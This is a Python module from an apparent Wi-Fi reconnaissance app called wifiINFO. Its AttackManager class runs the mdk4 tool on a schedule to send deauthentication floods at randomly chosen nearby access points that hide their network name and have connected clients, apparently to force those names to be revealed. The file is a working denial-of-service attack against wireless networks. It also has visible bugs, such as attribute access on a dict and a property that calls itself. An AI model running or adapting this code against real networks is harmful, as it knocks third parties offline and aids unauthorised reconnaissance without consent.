import time
import traceback
import subprocess
import random
import logging

from wifiINFO.models import Activelog
from wifiINFO.common.dataparser import Dataparser

logger = logging.getLogger("wifiINFO.attack")


class AttackManager(Dataparser):
    def __init__(self):
        try:
            super(AttackManager, self).__init__()
        except IOError:
            raise IOError
        self.ATKFACE = None

    def start(self):
        self.config.set(ATK_STATUS=True)
        self.ATKFACE = self.config.get('ATKFACE')

    def stop(self):
        self.config.set(ATK_STATUS=False)

    def deauth(self, bssid, channel):
        # Deauth
        try:
            process = subprocess.Popen([
                "mdk4",
                self.ATKFACE,
                "d",
                "-s",
                "20",
                "-c",
                channel,
                "-B",
                bssid
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            return process

        except Exception as e:
            print(e)

    def cron_atk(self):
        if not self.config.get('MAIN_STATUS'):
            return False

        if not self.config.get('ATK_STATUS'):
            return False

        target = self.random_target()
        process = self.deauth(target.bssid, target.channel)
        time.sleep(20)

        try:
            process.kill()
        except RuntimeError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())

    @staticmethod
    def random_target():
        try:
            no_essid_ap = Activelog.objects.filter(essid__isnull=True, client__isnull=False).values('bssid', 'channel')
            target = random.choice(no_essid_ap)

        except ConnectionError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())
            return False
        return target

    # @property
    # def config(self):
    #     return self.config

    @property
    def wifi_data(self):
        return self.wifi_data

    @property
    def station_data(self):
        return self._station_data
